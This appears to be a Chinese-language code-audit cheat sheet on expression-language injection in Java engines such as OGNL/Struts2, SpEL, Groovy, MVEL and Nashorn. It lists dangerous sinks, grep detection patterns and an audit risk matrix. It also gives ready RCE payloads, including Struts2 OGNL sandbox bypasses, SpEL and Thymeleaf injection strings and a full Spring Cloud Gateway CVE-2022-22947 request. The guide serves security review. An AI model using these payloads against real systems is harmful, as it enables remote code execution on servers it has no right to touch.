# Java 表达式引擎注入详解

## 目录

- [1. OGNL (Struts2)](#1-ognl-struts2)
- [2. SpEL (Spring Expression Language)](#2-spel-spring-expression-language)
- [3. MVEL](#3-mvel)
- [4. Groovy Shell](#4-groovy-shell)
- [5. JEXL (Apache Commons JEXL)](#5-jexl-apache-commons-jexl)
- [6. EL / JUEL](#6-el--juel)
- [7. ScriptEngine (Nashorn/Rhino)](#7-scriptengine-nashornrhino)
- [8. 其他引擎](#8-其他引擎)
- [9. 通用审计要点](#9-通用审计要点)

---

## 1. OGNL (Struts2)

### 识别特征

```java
import ognl.Ognl;
import ognl.OgnlContext;
import ognl.OgnlException;
import com.opensymphony.xwork2.ognl.OgnlUtil;
import com.opensymphony.xwork2.util.TextParseUtil;
```

### Maven 依赖

```xml
<dependency>
    <groupId>ognl</groupId>
    <artifactId>ognl</artifactId>
</dependency>
<!-- Struts2 内置 -->
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
</dependency>
```

### 危险 Sink 方法

```java
// 核心危险方法
Ognl.getValue(expression, context, root);       // 执行 OGNL 表达式
Ognl.setValue(expression, context, root, value); // 设置值
Ognl.parseExpression(expression);                // 解析表达式

// Struts2 封装
TextParseUtil.translateVariables(expression, valueStack);  // S2-045 入口
OgnlUtil.getValue(expression, context, root);
OgnlUtil.setValue(expression, context, root, value);

// Action 中直接使用
Ognl.getValue("#session.user", context, action);
```

### Struts2 触发入口

```bash
# URL 参数中的 ${...} 或 %{...}
# HTTP Header 注入（S2-045 Content-Type）
# Cookie 注入
# POST body 参数

# 检测特征：
# 1. web.xml 中有 StrutsPrepareAndExecuteFilter
# 2. struts.xml 或 struts-*.xml 配置文件
# 3. Action 类 extends ActionSupport
```

### Payload 演进

```
# 经典 (≤ 2.3.34)
${#_memberAccess.allowStaticMethodAccess=true,
  @java.lang.Runtime@getRuntime().exec('id')}

# _memberAccess 被限制后 (2.3.34-2.5.20)
${#_memberAccess.excludedClasses={},
  #_memberAccess.allowStaticMethodAccess=true,
  @java.lang.Runtime@getRuntime().exec('id')}

# 新沙箱绕过 (2.5.20+)
${(#container=#context['com.opensymphony.xwork2.ActionContext.container'])
  .(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))
  .(#ognlUtil.excludedClasses.clear())
  .(#ognlUtil.excludedPackageNames.clear())
  .(#_memberAccess.allowStaticMethodAccess=true)
  .(@java.lang.Runtime@getRuntime().exec('id'))}

# S2-045 (Content-Type 注入, 无需 URL 参数)
Content-Type: %{(#nike='multipart/form-data').(#cmd='id').(...
```

### Struts2 版本与 CVE 速查

| 版本 | CVE | 触发方式 | 摘要 |
|------|-----|---------|------|
| 2.3.5-2.3.31, 2.5-2.5.10 | S2-045 | Content-Type | Jakarta Multipart parser |
| 2.3.7-2.3.33, 2.5-2.5.12 | S2-046 | Content-Disposition | 文件名 OGNL 注入 |
| 2.3.0-2.3.34, 2.5.0-2.5.16 | S2-057 | URL namespace | alwaysSelectFullNamespace=true |
| 2.0.0-2.5.20 | S2-059 | 标签属性 | Struts 标签 OGNL 注入 |

### 搜索正则

```bash
grep -rnE "Ognl\.(getValue|setValue|parseExpression)|OgnlUtil|TextParseUtil" --include="*.java"
grep -rn "struts2-core" pom.xml
grep -rn "\$\{|%\{|#_memberAccess" --include="*.java" | grep -v "test\|Test"
find . -name "struts.xml" -o -name "struts-*.xml"
```

---

## 2. SpEL (Spring Expression Language)

### 识别特征

```java
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.beans.factory.annotation.Value;
```

### 危险 Sink 方法

```java
// 核心危险方法
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);  // ← 用户可控
exp.getValue();                                        // 执行
exp.getValue(context);                                 // 带上下文执行

// @Value 注解（Spring 自动求值）
@Value("#{userInput}")   // ❌ 若 userInput 来自外部，危险
private String value;

// Spring Cache 注解
@Cacheable(key = "#{userInput}")
@CacheEvict(key = "#{userInput}")

// Spring Security 注解
@PreAuthorize("#{userInput}")
@PostAuthorize("hasPermission(#obj, '#{userInput}')")

// Spring Integration
@Transformer(expression = "payload + userInput")
```

### 触发入口

```
1. 直接 parseExpression() 调用，表达式字符串来自用户输入
2. @Value 注解 + 外部配置文件中的 SpEL 表达式
3. Thymeleaf SSTI: __${...}__::.x → Spring Boot + Thymeleaf
4. Spring Cloud Gateway CVE-2022-22947: Actuator → Route → SpEL
5. Spring Data JPA: @Query 注解中的 SpEL 表达式
```

### Payload

```java
// 基础 RCE
T(java.lang.Runtime).getRuntime().exec("id")

// 带反射的 RCE (更稳定)
T(org.springframework.cglib.core.ReflectUtils).defineClass("Evil",T(org.springframework.util.Base64Utils).decode("..."),T(ClassLoader).getSystemClassLoader())

// 获取 ClassLoader (绕过某些限制)
T(org.springframework.util.ClassUtils).getDefaultClassLoader()

// Spring Boot Thymeleaf SSTI
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x

// Spring Cloud Gateway (CVE-2022-22947)
POST /actuator/gateway/routes/evil
{"id":"evil","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream()))}"}}],"uri":"http://example.com"}
```

### 搜索正则

```bash
grep -rnE "SpelExpressionParser|parseExpression\(|ExpressionParser|@Value\(\"#\{|StandardEvaluationContext" --include="*.java"
grep -rnE "T\(java\.lang\.Runtime\)|#{T\(" --include="*.java"
```

---

## 3. MVEL

### 识别特征

```java
import org.mvel2.MVEL;
import org.mvel2.MVELRuntime;
import org.mvel2.compiler.CompiledExpression;
import org.mvel2.templates.TemplateRuntime;
```

### 危险 Sink 方法

```java
// MVEL 1.x/2.x 核心
MVEL.eval(expression, vars);                  // 直接执行
MVEL.executeExpression(compiledExpression, vars);
MVEL.compileExpression(expression);           // 编译后执行

// MVEL 模板
TemplateRuntime.eval(template, vars);
TemplateRuntime.execute(template, vars);

// Drools 规则引擎 (底层使用 MVEL)
// 规则文件 .drl 中的 MVEL 表达式
```

### Payload

```java
// MVEL 1.x (非常危险，几乎无限制)
Runtime.getRuntime().exec("id")
// 或
new java.lang.ProcessBuilder("id").start()

// MVEL 2.x (更安全，但仍可能被绕过)
// 需要反射调用
```

### 搜索正则

```bash
grep -rnE "MVEL\.(eval|executeExpression|compileExpression)|TemplateRuntime\.(eval|execute)" --include="*.java"
grep -rnE "import org\.mvel2|mvel2" --include="*.java" pom.xml
```

---

## 4. Groovy Shell

### 识别特征

```java
import groovy.lang.GroovyShell;
import groovy.lang.GroovyClassLoader;
import groovy.util.GroovyScriptEngine;
import groovy.text.SimpleTemplateEngine;
import groovy.text.GStringTemplateEngine;
```

### 危险 Sink 方法

```java
// GroovyShell - 最危险的调用
GroovyShell shell = new GroovyShell();
shell.evaluate(userScript);           // ← 直接执行任意 Groovy 代码
shell.parse(userScript);              // 解析后执行
shell.evaluate(scriptFile);           // 执行脚本文件

// GroovyClassLoader
GroovyClassLoader gcl = new GroovyClassLoader();
Class clazz = gcl.parseClass(userScript);  // 动态加载类
clazz.getMethod("run").invoke(clazz.newInstance());

// GroovyScriptEngine
GroovyScriptEngine engine = new GroovyScriptEngine(paths);
engine.run(scriptName, binding);          // 执行脚本

// Jenkins 特有 (Jenkinsfile/CPS)
// WorkflowJob → Groovy CPS 执行
```

### Payload

```groovy
// 基础 RCE
"id".execute()
// 或
def proc = "id".execute()
println proc.text

// Runtime
Runtime.getRuntime().exec("id")

// ProcessBuilder
new ProcessBuilder("id").start()
```

### 搜索正则

```bash
grep -rnE "GroovyShell|GroovyClassLoader|GroovyScriptEngine|\.evaluate\(|\.parseClass\(|new GroovyShell" --include="*.java"
```

---

## 5. JEXL (Apache Commons JEXL)

### 识别特征

```java
import org.apache.commons.jexl3.JexlEngine;
import org.apache.commons.jexl3.JexlBuilder;
import org.apache.commons.jexl3.JexlExpression;
import org.apache.commons.jexl3.JexlScript;
```

### 危险 Sink 方法

```java
JexlEngine jexl = new JexlBuilder().create();
JexlExpression expr = jexl.createExpression(userInput);  // ← 用户可控
Object result = expr.evaluate(context);                  // 执行

JexlScript script = jexl.createScript(userInput);        // 更危险：支持多行
Object result = script.execute(context);
```

### 搜索正则

```bash
grep -rnE "JexlEngine|JexlBuilder|createExpression|createScript|JexlExpression" --include="*.java"
```

---

## 6. EL / JUEL

### 识别特征

```java
import javax.el.ExpressionFactory;
import javax.el.ValueExpression;
import javax.el.ELProcessor;
import javax.el.ELManager;
import javax.el.StandardELContext;

// JUEL
import de.odysseus.el.ExpressionFactoryImpl;
```

### 危险 Sink 方法

```java
ExpressionFactory factory = ExpressionFactory.newInstance();
ELContext context = new StandardELContext(factory);
ValueExpression ve = factory.createValueExpression(context, "${" + userInput + "}", Object.class);
ve.getValue(context);  // 执行
```

### 搜索正则

```bash
grep -rnE "createValueExpression|createMethodExpression|ELProcessor\.(eval|setValue|getValue)" --include="*.java"
```

---

## 7. ScriptEngine (Nashorn/Rhino)

### 识别特征

```java
import javax.script.ScriptEngineManager;
import javax.script.ScriptEngine;
import javax.script.Invocable;
```

### 危险 Sink 方法

```java
ScriptEngineManager manager = new ScriptEngineManager();
ScriptEngine engine = manager.getEngineByName("js");  // JavaScript
engine.eval(userScript);  // ← 执行 JavaScript 代码

// Nashorn 特有 (JDK 8-14)
engine.eval("java.lang.Runtime.getRuntime().exec('id')");
engine.eval("new java.lang.ProcessBuilder('id').start()");

// 调用 Java 方法
Invocable invocable = (Invocable) engine;
invocable.invokeFunction("functionName", args);
```

### 搜索正则

```bash
grep -rnE "ScriptEngineManager|ScriptEngine|\.eval\(|Invocable\.invoke" --include="*.java"
```

---

## 8. 其他引擎

### Aviator

```java
import com.googlecode.aviator.AviatorEvaluator;

// 危险调用
AviatorEvaluator.execute(userExpression);   // ← 用户可控
AviatorEvaluator.compile(userExpression);   // 编译后执行

// Aviator 相对安全，默认禁用 Java 反射调用
// 但自定义函数可能导致沙箱绕过
```

### Janino

```java
import org.codehaus.janino.ScriptEvaluator;
import org.codehaus.janino.ExpressionEvaluator;

ScriptEvaluator se = new ScriptEvaluator();
se.cook(userScript);    // 编译用户代码
se.evaluate(null);      // 执行

// Janino 可直接编译执行 Java 代码，沙箱几乎没有 → 即时 RCE
```

---

## 9. 通用审计要点

### 判定矩阵

```
表达式注入风险 = f(引擎类型, 表达式可控性, 鉴权状态, 沙箱配置)

判定规则：
├── GroovyShell.evaluate(用户输入) → 🔴 无论鉴权，即时 RCE
├── Janino 编译用户代码 → 🔴 即时 RCE
├── ScriptEngine.eval(用户输入) → 🔴 即时 RCE (Nashorn)
├── OGNL + Struts2 ≤ 2.5.20 + 任意入口可达 → 🔴 S2-045 等无鉴权攻击
├── SpEL parseExpression(用户输入) + 无鉴权 → 🔴
├── FreeMarker.process(用户模板) + ?new 可用 → 🔴
├── JEXL/MVEL 用户表达式 → 🔴
├── 有鉴权 + 引擎表达式可控 → 🟡 High
└── 不可控表达式 + 受限沙箱 → 🟢 Low/排除
```

### 常见遗漏点

- **@Value 注解中的 SpEL** — 静态分析容易被忽略
- **Spring Cache 注解** — @Cacheable(key = "#{...}") 中可能存在注入
- **Spring Security 注解** — @PreAuthorize/@PostAuthorize 中拼入用户输入
- **Drools 规则** — .drl 文件中的 MVEL 表达式
- **Jenkins Pipeline** — Jenkinsfile 中的 Groovy 脚本
- **Flowable/Activiti** — 工作流引擎中的 UEL 表达式
- **Beetl/Enjoy** — 国产模板引擎的表达式注入
